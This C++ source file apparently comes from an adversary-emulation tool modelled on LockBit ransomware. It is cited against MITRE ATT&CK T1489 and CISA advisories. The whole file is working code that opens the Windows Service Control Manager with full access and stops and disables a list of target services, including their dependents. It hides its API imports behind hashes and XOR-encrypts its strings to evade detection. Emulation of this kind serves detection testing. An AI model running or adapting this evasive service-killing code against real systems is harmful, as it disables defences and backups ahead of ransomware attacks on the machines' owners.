#include "crypto/xor_obfuscation.hpp"
#include "logger.hpp"
#include "tamper.hpp"
#include "util/string_util.hpp"
#include "util/winapihelper.hpp"
#include <stdexcept>
#include <format>
#include <chrono>
#include <thread>

#define MAX_SVC_STOP_WAIT_MS 30000

namespace tamper {

void stopService(SC_HANDLE h_scm, const std::wstring& service_name, bool disable_svc);
void stopDependentServices(SC_HANDLE h_scm, SC_HANDLE h_svc, const std::string& service_name);
void disableService(SC_HANDLE h_svc, const std::string& svc_name);
void waitForSvcStop(SC_HANDLE h_svc, DWORD wait_ms, DWORD max_wait_ms);
DWORD get_wait_time(DWORD wait_hint);

/*
 * TerminateAndDisableServices:
 *      About:
 *          Attempts to stop and disable each service in the provided list of targets. If the service has dependent
 *          services, those services will also be stopped first, but not disabled. Requires elevated privileges.
 *          Relevant API calls:
 *              OpenSCManagerW, OpenServiceW, ControlService, QueryServiceStatusEx, 
 *              EnumDependentServicesW, ChangeServiceConfigW
 *      Result:
 *          Stopped and disabled services.
 *      MITRE ATT&CK Techniques:
 *          T1489: Service Stop
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
 */
bool TerminateAndDisableServices(const std::vector<std::wstring>& svc_names) {
    XorLogger::LogInfo(XOR_LIT("Attempting to terminate and disable services."));
    DWORD error_code;
    FP_CloseServiceHandle closeServiceHandle = (FP_CloseServiceHandle)winapi_helper::GetAPI(0x2517fe78, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (closeServiceHandle == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CloseServiceHandle. Error code"), error_code));
        return false;
    }
    FP_OpenSCManagerW openSCManagerW = (FP_OpenSCManagerW)winapi_helper::GetAPI(0xbaef479f, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (openSCManagerW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for OpenSCManagerW. Error code"), error_code));
        return false;
    }

    bool success = true;
    SC_HANDLE h_scm = openSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_ALL_ACCESS);
    if (h_scm == NULL) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get handle to service control manager. Error code"), GetLastError()));
        return false;
    }
    XorLogger::LogDebug(XOR_LIT("Connected to local Service Control Manager."));

    for (const std::wstring& svc: svc_names) {
        std::string svc_name_a = string_util::wstring_to_string(svc);
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Stopping and disabling service"), svc_name_a));
        try {
            stopService(h_scm, svc, true);
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{} {}: {}", XOR_LIT("Failed to stop and disable service"), svc_name_a, e.what()));
            success = false;
        } catch (...) {
            XorLogger::LogError(std::format("{} {}.", XOR_LIT("Unknown exception when stopping and disabling service"), svc_name_a));
            success = false;
        }
    }
    closeServiceHandle(h_scm);
    return success;
}

// Stops the given service and sets start type to Disabled if disable_svc is set to true.
// Throws exceptions if the service exists but cannot be accessed, stopped, or disabled.
// If the service does not exist, a message is logged, but no exception is thrown.
// Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
void stopService(SC_HANDLE h_scm, const std::wstring& service_name, bool disable_svc) {
    DWORD error_code;
    FP_CloseServiceHandle closeServiceHandle = (FP_CloseServiceHandle)winapi_helper::GetAPI(0x2517fe78, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (closeServiceHandle == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for CloseServiceHandle. Error code"), error_code));
    }
    FP_OpenServiceW openServiceW = (FP_OpenServiceW)winapi_helper::GetAPI(0x7c8058df, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (openServiceW == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for OpenServiceW. Error code"), error_code));
    }
    FP_QueryServiceStatusEx queryServiceStatusEx = (FP_QueryServiceStatusEx)winapi_helper::GetAPI(0x018db08d, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (queryServiceStatusEx == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for QueryServiceStatusEx. Error code"), error_code));
    }
    FP_ControlService controlService = (FP_ControlService)winapi_helper::GetAPI(0x527a0217, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (controlService == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for ControlService. Error code"), error_code));
    }

    DWORD wait_time;
    std::string svc_name_a = string_util::wstring_to_string(service_name);
    
    // Access service
    SC_HANDLE h_svc = openServiceW(h_scm, service_name.c_str(), SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG | SERVICE_STOP | SERVICE_ENUMERATE_DEPENDENTS);
    if (h_svc == NULL) {
        error_code = GetLastError();
        if (error_code == ERROR_SERVICE_DOES_NOT_EXIST) {
            XorLogger::LogInfo(std::format("{} {} does not exist.", XOR_LIT("Service"), svc_name_a));
            return;
        } else {
            throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("Failed to get handle to service"), svc_name_a, GetLastError()));
        }
    }

    // Check if service is already stopped
    XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Checking status for service"), svc_name_a));
    SERVICE_STATUS_PROCESS ssp;
    DWORD ssp_bytes_needed;
    if (!queryServiceStatusEx(h_svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &ssp_bytes_needed)) {
        error_code = GetLastError();
        closeServiceHandle(h_svc);
        throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("QueryServiceStatusEx failed for service"), svc_name_a, error_code));
    }
    if (ssp.dwCurrentState == SERVICE_STOPPED) {
        XorLogger::LogInfo(XOR_LIT("Service is already stopped."));
    } else if (ssp.dwCurrentState == SERVICE_STOP_PENDING) {
        // If stop is currently pending, wait between 1 to 10 seconds, depending on wait hint
        XorLogger::LogDebug(XOR_LIT("Service is already pending stop. Waiting."));
        wait_time = get_wait_time(ssp.dwWaitHint);
        try {
            waitForSvcStop(h_svc, wait_time, wait_time);
        } catch (const std::exception& e) {
            closeServiceHandle(h_svc);
            throw std::runtime_error(std::format("{} {} to stop: {}", XOR_LIT("Failed to wait for service"), svc_name_a, e.what()));
        } catch (...) {
            closeServiceHandle(h_svc);
            throw std::runtime_error(std::format("{} {} to stop.", XOR_LIT("Unknown exception when waiting for service"), svc_name_a));
        }
    } else {
        // Service needs to be stopped. Stop dependent services first.
        try {
            stopDependentServices(h_scm, h_svc, svc_name_a);
        } catch (const std::exception& e) {
            closeServiceHandle(h_svc);
            throw std::runtime_error(std::format("{} {}: {}", XOR_LIT("Failed to stop dependent services for service"), svc_name_a, e.what()));
        } catch (...) {
            closeServiceHandle(h_svc);
            throw std::runtime_error(std::format("{} {}", XOR_LIT("Unknown exception when stopping dependent services for service"), svc_name_a));
        }

        // Send stop code to service
        SERVICE_STATUS svc_status;
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Sending stop code to service"), svc_name_a));
        if (!controlService(h_svc, SERVICE_CONTROL_STOP, &svc_status)) {
            error_code = GetLastError();
            closeServiceHandle(h_svc);
            throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("ControlService failed for service"), svc_name_a, error_code));
        }

        XorLogger::LogDebug(std::format(
            "{} {}. {}",
            XOR_LIT("Sent stop code to service"),
            svc_name_a,
            XOR_LIT("Waiting for service to stop.")
            ));
        if (svc_status.dwCurrentState == SERVICE_STOPPED) {
            XorLogger::LogInfo(std::format("{} {}.", XOR_LIT("Successfully stopped service"), svc_name_a));
        } else {
            // Wait for the service to stop
            wait_time = get_wait_time(svc_status.dwWaitHint);
            try {
                waitForSvcStop(h_svc, wait_time, MAX_SVC_STOP_WAIT_MS);
            } catch (const std::exception& e) {
                closeServiceHandle(h_svc);
                throw std::runtime_error(std::format("{} {} to stop: {}", XOR_LIT("Failed to wait for service"), svc_name_a, e.what()));
            } catch (...) {
                closeServiceHandle(h_svc);
                throw std::runtime_error(std::format("{} {} to stop.", XOR_LIT("Unknown exception when waiting for service"), svc_name_a));
            }
        }
    }
    if (disable_svc) {
        disableService(h_svc, svc_name_a);
    }
    closeServiceHandle(h_svc);
}

// Enumerates and stops dependent services for the given service.
// Throws exception upon failure to enumerate or stop dependent services.
// Reference: https://learn.microsoft.com/en-us/windows/win32/services/stopping-a-service
void stopDependentServices(SC_HANDLE h_scm, SC_HANDLE h_svc, const std::string& service_name) {
    DWORD error_code;
    FP_EnumDependentServicesW enumDependentServicesW = (FP_EnumDependentServicesW)winapi_helper::GetAPI(0xdc42f78c, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (enumDependentServicesW == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for EnumDependentServicesW. Error code"), error_code));
    }
    
    XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Enumerating and stopping dependent services for service"), service_name));

    // Get required buffer size
    DWORD bytes_needed = 0;
    DWORD num_dep_services = 0;
    if (enumDependentServicesW(h_svc, SERVICE_ACTIVE, NULL, 0, &bytes_needed, &num_dep_services)) {
        // If the API call succeeds with 0-length buffer, then there are no dependent services
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("No dependent services to stop for service"), service_name));
        return;
    } else {
        error_code = GetLastError();
        if (error_code != ERROR_MORE_DATA) {
            throw std::runtime_error(std::format("{} {}", XOR_LIT("EnumDependentServices failed with error code"), error_code));
        }
    }

    // Get dependency information
    XorLogger::LogDebug(std::format("{} {} for dependencies.", XOR_LIT("Allocating buffer of size"), bytes_needed));
    std::vector<unsigned char> buf(bytes_needed);
    ENUM_SERVICE_STATUSW* p_dependencies = (ENUM_SERVICE_STATUSW*)(&buf[0]);
    ENUM_SERVICE_STATUSW ess;
    if (!enumDependentServicesW(h_svc, SERVICE_ACTIVE, p_dependencies, bytes_needed, &bytes_needed, &num_dep_services)) {
        throw std::runtime_error(std::format("{} {}", XOR_LIT("EnumDependentServices (second time) failed with error code"), GetLastError()));
    }
    XorLogger::LogDebug(std::format("Found {} {}", num_dep_services, XOR_LIT("dependent services.")));
    for (DWORD i = 0; i < num_dep_services; i++) {
        // Stop each dependent service (but don't disable them)
        ess = p_dependencies[i];
        std::wstring dep_svc_name(ess.lpServiceName);
        XorLogger::LogInfo(std::format("{} {}", XOR_LIT("Stopping dependent service"), string_util::wstring_to_string(dep_svc_name)));
        stopService(h_scm, dep_svc_name, false);
    }
}

// Sets service start type to Disabled
void disableService(SC_HANDLE h_svc, const std::string& svc_name) {
    DWORD error_code;
    FP_ChangeServiceConfigW changeServiceConfigW = (FP_ChangeServiceConfigW)winapi_helper::GetAPI(0x77a04a89, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (changeServiceConfigW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to disable service. Failed to get address for ChangeServiceConfigW. Error code"), error_code));
    }

    bool result = changeServiceConfigW(
        h_svc,
        SERVICE_NO_CHANGE, // not changing existing service type
        SERVICE_DISABLED,  // set start type to disabled
        SERVICE_NO_CHANGE, // not changing error control
        NULL,              // not changing existing binary path
        NULL,              // not changing existing load ordering group
        NULL,              // not changing existing tag
        NULL,              // not changing existing dependencies
        NULL,              // not changing existing account name
        NULL,              // not changing existing password
        NULL               // not changing existing display name
    );
    if (result) {
        XorLogger::LogInfo(std::format("{} {}.", XOR_LIT("Successfully disabled service"), svc_name));
    } else {
        XorLogger::LogError(std::format(
            "{} {}. {}: {}",
            XOR_LIT("Failed to disable service"),
            svc_name,
            XOR_LIT("ChangeServiceConfig error code"),
            GetLastError()
        ));
    }
}

// Waits for service to stop using the given wait times. Throws exception if wait fails or times out.
void waitForSvcStop(SC_HANDLE h_svc, DWORD wait_ms, DWORD max_wait_ms) {
    DWORD error_code;
    FP_QueryServiceStatusEx queryServiceStatusEx = (FP_QueryServiceStatusEx)winapi_helper::GetAPI(0x018db08d, XOR_WIDE_LIT(L"Advapi32.dll"), &error_code);
    if (queryServiceStatusEx == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for QueryServiceStatusEx. Error code"), error_code));
    }

    DWORD total_time_waited = 0;
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytes_needed;
    while (total_time_waited < max_wait_ms) {
        std::this_thread::sleep_for(std::chrono::milliseconds(wait_ms));
        total_time_waited += wait_ms;

        // Check if service has finally stopped
        if (!queryServiceStatusEx(h_svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytes_needed)) {
            DWORD error_code = GetLastError();
            throw std::runtime_error(std::format("{}: {}", XOR_LIT("QueryServiceStatusEx failed with error code"), GetLastError()));
        }
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            XorLogger::LogInfo(XOR_LIT("Service stopped successfully."));
            return;
        }
    }
    throw std::runtime_error(XOR_LIT("Service stop timed out."));
}

// Generates a wait time using the provided wait hint. 
// Will use one-tenth of the wait hint, but will ensure
// the wait time is no less than 1 second and no more than 10 seconds
DWORD get_wait_time(DWORD wait_hint) {
    DWORD wait_time = wait_hint / 10;
    if (wait_time < 1000) {
        return 1000;
    } else if (wait_time > 10000) {
        return 10000;
    }
    return wait_time;
}

} // namespace